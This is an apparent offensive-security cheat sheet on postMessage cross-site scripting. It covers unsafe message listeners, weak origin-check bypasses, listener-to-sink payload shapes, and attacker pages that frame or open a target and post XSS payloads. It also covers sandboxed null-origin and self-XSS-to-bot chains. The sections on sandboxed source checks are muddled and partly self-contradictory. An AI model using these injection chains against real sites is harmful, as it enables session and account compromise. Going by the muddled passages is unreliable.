# postMessage XSS — cross-frame message flows

`postMessage` sends data between windows/iframes across origins.
The vulnerability: a listener that accepts messages WITHOUT
checking `event.origin` — any page can inject data into it.

---

## 1. The vulnerable-listener patterns

```javascript
// no origin check — the classic:
window.addEventListener('message', function(e){
   document.getElementById('x').innerHTML = e.data;
});

// check exists but broken:
if (e.origin === 'https://target.com')      // — but uses endsWith/regex:
if (e.origin.endsWith('target.com'))         // matches eviltarget.com!
if (e.origin.indexOf('target')>-1)           // substring match!
if (/target/.test(e.origin))                  // regex without anchors!
if (e.origin.startsWith('https://target'))    // https://target.evil.com!

// check the SOURCE but not the origin:
if (e.source === window.parent)              -- parent's origin not checked
   -- a child can be re-framed by a different parent
```

The `endsWith`/`indexOf`/regex-without-`^` bugs are the most common —
`evil-target.com`, `target.com.evil.com`, `nottarget.com` all pass.

---

## 2. The attack pattern — your page injects

```html
<!-- your attacker page: -->
<iframe src="https://target.com/page"></iframe>
<script>
  var w = frames[0];
  w.onload = () => w.postMessage('<img src=x onerror=alert(1)>','*');
  // or postMessage before load completes — target must be listening
</script>
```

`postMessage(data, '*')` — the `*` targetOrigin lets any window
receive. The listener decides whether to act on `e.origin`.

For window.open flows:

```javascript
var w = window.open('https://target.com/page');
w.postMessage('<img src=x onerror=alert(1)>', '*');
   — the opened window's listener gets it
```

---

## 3. Finding the listeners

```javascript
// grep the bundle for listener patterns:
window.addEventListener('message'
onmessage =
self.onmessage
window.onmessage
.addEventListener("message"

// chrome devtools: Event Listeners panel → message events
// or: getEventListeners(window).message in console
```

`tools/web/bundle_miner.py` digs source-maps for these patterns.

---

## 4. The listener→sink matrix

What `e.data` feeds — the sink after the check:

```javascript
el.innerHTML = e.data;                  → html context — tag payloads
eval(e.data);                           → code — alert(1) direct
location.href = e.data;                  → URL — javascript:
el.srcdoc = e.data;                      → iframe markup
$(e.data);                               → jQuery html-or-select
postMessage(e.data, '*') to ANOTHER frame → chain to the next
worker.postMessage(e.data)               → worker context
JSON.parse(e.data).x                     → JSON string first — needs
                                           valid JSON structure
```

The sink shapes the payload — innerHTML wants tags, eval wants
code, href wants `javascript:`.

---

## 5. The "valid JSON" constraint

```javascript
window.addEventListener('message', e=>{
   var d = JSON.parse(e.data);
   el.innerHTML = d.html;
});
```

The message must be parseable JSON — the HTML goes in a field:

```javascript
w.postMessage('{"html":"<img src=x onerror=alert(1)>"}','*');
w.postMessage(JSON.stringify({html:'<svg onload=alert(1)>'}),'*');
```

Some listeners expect specific fields — read the handler code and
mirror its expected shape exactly.

---

## 6. Multi-frame chains — postMessage relay

```javascript
// frame A (your iframe) → target frame B → inner frame C:
// B's listener writes to C — chain your payload through:
window.frames[0].postMessage('<img src=x onerror=alert(1)>','*');
   → B's listener writes it into C's DOM
```

The target's own iframe-nesting is the chain path — read the page's
frame tree to find the listener that reaches a sink.

---

## 7. The origin-check bypasses

```javascript
e.origin === 'https://target.com'         — exact match: can't fake
e.origin.indexOf('target') > -1            — substrings pass:
   'https://evil-target.com'  'https://target.evil.com'
e.origin.endsWith('.target.com')           — subdomain required:
   you need a real subdomain — not faking, USE one (CNAME or your
   own subdomain of a shared host)
e.origin.startsWith('https://target.com')  — prefix: evil path —
   'https://target.com.evil.com' passes!
e.origin.match(/^https?:\/\/.*target\.com/) — regex bugs
new URL(e.origin).host === 'target.com'    — strict — can't fake
```

The `endsWith`/regex variants are the common vulns — `target.com`
substring/ suffix matches on lookalike domains.

---

## 8. `e.source` checks — the frame-identity gate

```javascript
if (e.source !== window.opener) return;
   — only the opener can message — if the opener is an iframe'd
     page, and you control an iframe INSIDE it, you can be a
     fake source... actually source check is hard to fake —
     e.source is the actual Window object
```

`e.source` checks are harder — the source IS the Window object.
The bypass: the target expects messages from a specific frame —
embed that frame in YOUR page and send messages THROUGH it.

---

## 9. The null-origin bypass — sandboxed iframes

```javascript
// your page:
<iframe sandbox="allow-scripts"
        src="https://target.com/page"></iframe>
// the sandboxed frame's origin is 'null' —
// if the listener checks e.origin === 'null' → you pass!
// or a listener with NO check — the sandbox doesn't matter anyway
```

`allow-scripts` + `allow-same-origin` both-off = origin "null" —
any postMessage from a null-origin frame passes a `null` check.

---

## 10. The self-XSS-to-real chain — postMessage as the bridge

You have self-XSS on a page (payload only affects YOUR browser) —
bridge it via postMessage to reach the bot:

```javascript
// bot visits YOUR page → your JS opens target:
var w = window.open('https://target.com/self-xss-page');
w.postMessage(payload, '*');
   — the target's listener (no origin check) takes it — your
     self-XSS page becomes the sink for the bot's session
```

postMessage turns "only I see it" into "whoever visits my page
sees it through the target's lens".

---

## 11. The detection protocol

```text
1. bundle_mine / grep for addEventListener('message'
2. read each listener: does it check e.origin? how?
3. what does it do with e.data? (the sink)
4. can you reach the frame? (iframe / window.open / same window)
5. build the postMessage call that satisfies the checks + sink
```

The payload shape:

```javascript
// your page:
<iframe id=f src="https://target/page"></iframe>
<script>
f.onload = () => f.contentWindow.postMessage(
   'THE_PAYLOAD', '*');
</script>
```

`contentWindow` not `frames[0]` — safer across browsers.
